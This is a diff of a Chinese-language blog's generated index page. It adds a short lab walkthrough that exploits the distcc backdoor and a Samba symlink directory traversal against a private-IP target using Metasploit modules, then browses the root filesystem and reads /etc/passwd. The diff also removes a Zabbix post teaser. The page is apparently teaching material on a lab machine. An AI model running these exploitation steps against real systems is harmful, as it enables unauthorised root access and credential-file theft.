@@ -254,6 +254,195 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/08/19/Distcc后门漏洞-Samba-sysmlink默认配置目录遍历漏洞/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="迪仔">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="DiZai">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/08/19/Distcc后门漏洞-Samba-sysmlink默认配置目录遍历漏洞/" itemprop="url">Distcc后门漏洞 && Samba sysmlink默认配置目录遍历漏洞</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-08-19T20:20:08+08:00">
+                2018-08-19
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/漏洞分析/" itemprop="url" rel="index">
+                    <span itemprop="name">漏洞分析</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  408
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  2
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"> 
+	 
+      
+
+      
+        
+          
+            <h3 id="Distcc后门漏洞"><a href="#Distcc后门漏洞" class="headerlink" title="Distcc后门漏洞"></a>Distcc后门漏洞</h3><h4 id="【目的】"><a href="#【目的】" class="headerlink" title="【目的】"></a>【目的】</h4><p><strong>利用Distcc后门漏洞获取目标主机的root权限。</strong></p>
+<!--mnore-->
+<h4 id="【原理】"><a href="#【原理】" class="headerlink" title="【原理】"></a>【原理】</h4><p>Distcc用于大量代码在网络服务器上的分布式编译，但是如果配置不严格，容易被滥用执行命令，该漏洞是XCode 1.5版本及其他版本的distcc 2.x版本配置对于服务器端口的访问不限制</p>
+<h4 id="【步骤】"><a href="#【步骤】" class="headerlink" title="【步骤】"></a>【步骤】</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1.在kali中执行msfconsole，启动metasploit 2</span><br><span class="line"></span><br><span class="line">use exploit/unix/misc/distcc_exec   #选择漏洞</span><br><span class="line"></span><br><span class="line">show options      #显示需要设置的参数</span><br><span class="line"></span><br><span class="line">set RHOST 192.168.199.126      #设置要攻击的靶机IP</span><br><span class="line"></span><br><span class="line">exploit     #开始攻击</span><br></pre></td></tr></table></figure>
+<p><img src="/images/漏洞/1.png" alt="upload successful"></p>
+<p>2.执行id  查看权限，uname -a 验证服务器信息。</p>
+<p><img src="/images/漏洞/2.png" alt="upload successful"></p>
+<h3 id="Samba-sysmlink默认配置目录遍历漏洞"><a href="#Samba-sysmlink默认配置目录遍历漏洞" class="headerlink" title="Samba sysmlink默认配置目录遍历漏洞"></a>Samba sysmlink默认配置目录遍历漏洞</h3><p>Samba是linux和unix系统上实现smb协议的一个免费软件，由客户机和服务器构成。 SMB是一种在局域网上实现共享文件和打印机的协议。存在一个服务器，客户机通过该协议可以服务器上的共享文件系统和打印机以及其他的资源。通过设置，还可以和全世界的电脑分享资源 :</p>
+<h4 id="【步骤】-1"><a href="#【步骤】-1" class="headerlink" title="【步骤】"></a>【步骤】</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1.在kali中执行msfconsole，启动metasploit2</span><br><span class="line"></span><br><span class="line">use auxiliary/admin/smb/samba_symlink_traversal   #选择漏洞</span><br><span class="line"></span><br><span class="line">set RHOST 192.168.199.126  #设置要攻击的靶机IP</span><br><span class="line"></span><br><span class="line">set SMBSHARE tmp  #设置SAM可写文件</span><br><span class="line"></span><br><span class="line">exploit  #开始攻击</span><br></pre></td></tr></table></figure>
+<p><img src="/images/漏洞/3.png" alt="upload successful"></p>
+<p>2.<strong>在新的终端下执行smbclient命令打开上面生成的共享目录</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">smbclient //192.168.199.126/tmp</span><br><span class="line"></span><br><span class="line">cd rootfs</span><br><span class="line"></span><br><span class="line">ls</span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/漏洞/4.png" alt="upload successful"></p>
+<h4 id="3-列出密码"><a href="#3-列出密码" class="headerlink" title="3.列出密码"></a>3.列出密码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">more /etc/passwd   #列出密码文件，可用成功。</span><br></pre></td></tr></table></figure>
+<p><img src="/images/漏洞/5.png" alt="upload successful"></p>
+
+          
+        
+      
+    </div>
+	
+	<div>
+	
+	</div>
+    
+    
+    
+	
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/08/15/CentOS-下-LNMP-环境配置（yum安装）/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1871,188 +2060,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/08/10/Zabbix可视化监控的搭建/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="迪仔">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="DiZai">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/08/10/Zabbix可视化监控的搭建/" itemprop="url">Zabbix可视化监控的搭建</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-08-10T20:07:00+08:00">
-                2018-08-10
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/安全运维/" itemprop="url" rel="index">
-                    <span itemprop="name">安全运维</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  1,341
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  6
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody"> 
-	 
-      
-
-      
-        
-          <h3 id="【前言】"><a href="#【前言】" class="headerlink" title="【前言】"></a>【前言】</h3><blockquote>
-<p>zabbix（音同 za:bix）是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。zabbix能监视各种网络参数，保证服务器系统的安全运营；并提供灵活的通知机制以让系统管理员快速定位/解决存在的各种问题。zabbix由2部分构成，zabbix server与可选组件zabbix agent。zabbix server可以通过SNMP，zabbix agent，ping，端口监视等方法提供对远程服务器/网络状态的监视，数据收集等功能，它可以运行在Linux，Solaris，HP-UX，AIX，Free BSD，Open BSD，OS X等平台上。</p>
-</blockquote>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2018/08/10/Zabbix可视化监控的搭建/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-	
-	<div>
-	
-	</div>
-    
-    
-    
-	
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2103,7 +2110,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-count">14</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -2125,7 +2132,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">15</span>
+                  <span class="site-state-item-count">17</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -2194,7 +2201,7 @@
 
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共30.4k字</span>
+  <span class="post-count">博客全站共30.9k字</span>
 </div>
 
         
